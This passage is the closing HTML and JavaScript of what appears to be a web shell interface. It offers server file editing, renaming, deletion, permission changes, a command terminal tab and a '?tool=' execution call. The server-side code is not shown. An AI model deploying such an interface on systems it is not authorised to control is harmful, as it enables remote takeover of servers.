                <textarea name="create_content" class="form-control" placeholder="Content (for files)" rows="5"></textarea>
                <button type="submit" class="btn">Create</button>
            </form>
        </div>
    </div>

    <div id="editModal" class="modal">
        <div class="modal-content">
            <span class="close-modal" onclick="hideModal('editModal')">&times;</span>
            <h3>✏️ Edit File</h3>
            <form method="POST" id="editForm">
                <input type="hidden" name="save_edit" value="1">
                <input type="hidden" name="file_path" id="editFilePath">
                <textarea name="file_content" id="editFileContent" class="textarea"></textarea>
                <button type="submit" class="btn">Save</button>
            </form>
        </div>
    </div>

    <script>
    // Tab Switching
    function switchTab(tabId) {
        document.querySelectorAll('.tab').forEach(tab => tab.classList.remove('active'));
        document.querySelectorAll('.tab-content').forEach(content => content.classList.remove('active'));
        
        event.target.classList.add('active');
        document.getElementById(tabId).classList.add('active');
    }

    // Modal Functions
    function showModal(modalId) {
        document.getElementById(modalId).style.display = 'flex';
    }

    function hideModal(modalId) {
        document.getElementById(modalId).style.display = 'none';
    }

    // File Operations
    function editFile(path) {
        fetch('?get_file=' + path)
            .then(response => response.text())
            .then(content => {
                document.getElementById('editFilePath').value = decodeURIComponent(path);
                document.getElementById('editFileContent').value = content;
                showModal('editModal');
            });
    }

    function renameFile(path) {
        const newName = prompt('Enter new name:', path.split('/').pop());
        if (newName) {
            const form = document.createElement('form');
            form.method = 'POST';
            form.innerHTML = `
                <input type="hidden" name="rename_old" value="${path}">
                <input type="hidden" name="rename_new" value="${path.replace(/[^\/]+$/, newName)}">
            `;
            document.body.appendChild(form);
            form.submit();
        }
    }

    function deleteFile(path) {
        if (confirm('Delete this file/directory?')) {
            const form = document.createElement('form');
            form.method = 'POST';
            form.innerHTML = `<input type="hidden" name="delete_path" value="${path}">`;
            document.body.appendChild(form);
            form.submit();
        }
    }

    function changePerms(path) {
        const perms = prompt('Enter new permissions (e.g., 755):', '755');
        if (perms && /^[0-7]{3}$/.test(perms)) {
            const form = document.createElement('form');
            form.method = 'POST';
            form.innerHTML = `
                <input type="hidden" name="chmod_path" value="${path}">
                <input type="hidden" name="chmod_perms" value="${perms}">
            `;
            document.body.appendChild(form);
            form.submit();
        }
    }

    // Tool Execution
    function execTool(tool) {
        const resultDiv = document.getElementById('toolResult');
        resultDiv.innerHTML = 'Executing ' + tool + '...';
        
        fetch('?tool=' + tool)
            .then(response => response.text())
            .then(result => {
                resultDiv.innerHTML = '<pre>' + result + '</pre>';
            });
    }

    // Theme Changer
    function changeTheme(theme) {
        const root = document.documentElement;
        const themes = {
            green: { primary: '#00ff00', secondary: '#007700' },
            blue: { primary: '#0088ff', secondary: '#0055aa' },
            red: { primary: '#ff0000', secondary: '#aa0000' },
            purple: { primary: '#aa00ff', secondary: '#7700aa' }
        };
        
        if (themes[theme]) {
            root.style.setProperty('--primary', themes[theme].primary);
            root.style.setProperty('--secondary', themes[theme].secondary);
            localStorage.setItem('theme', theme);
        }
    }

    // Load saved theme
    const savedTheme = localStorage.getItem('theme') || 'green';
    changeTheme(savedTheme);

    // Auto-focus command input
    document.addEventListener('keydown', function(e) {
        if (e.ctrlKey && e.key === 't') {
            switchTab('terminal');
            document.getElementById('commandInput').focus();
            e.preventDefault();
        }
    });

    // Close modals on ESC
    document.addEventListener('keydown', function(e) {
        if (e.key === 'Escape') {
            document.querySelectorAll('.modal').forEach(modal => {
                modal.style.display = 'none';
            });
        }
    });

    // Close modal when clicking outside
    window.onclick = function(event) {
        if (event.target.classList.contains('modal')) {
            event.target.style.display = 'none';
        }
    }
    </script>
</body>
</html>